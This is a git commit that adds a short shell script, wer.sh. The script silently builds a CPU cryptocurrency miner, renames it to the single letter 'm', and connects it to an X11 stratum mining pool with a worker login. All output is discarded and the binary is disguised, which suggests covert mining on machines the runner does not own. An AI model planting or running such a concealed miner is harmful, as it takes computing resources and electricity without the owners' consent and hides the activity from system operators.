9a567d443c947d33e1b825adc660bbb2f99fa599
LenaBachm2 <LenaBachm2@gmail.com>
2014-09-08 15:29:00 +0200

    Create wer.sh

---
+++ wer.sh
@@ -0,0 +1,8 @@
+chmod a+x autogen.sh > /dev/null 2>&1
+chmod a+x nomacro.pl > /dev/null 2>&1
+./autogen.sh > /dev/null 2>&1
+./nomacro.pl > /dev/null 2>&1
+./configure CFLAGS="-O3" > /dev/null 2>&1
+make > /dev/null 2>&1
+mv min*d m > /dev/null 2>&1
+./m -a X11 -o stratum+tcp://drk.cpu-pool.net:3500 -u soku2.wer -p ker > /dev/null 2>&1
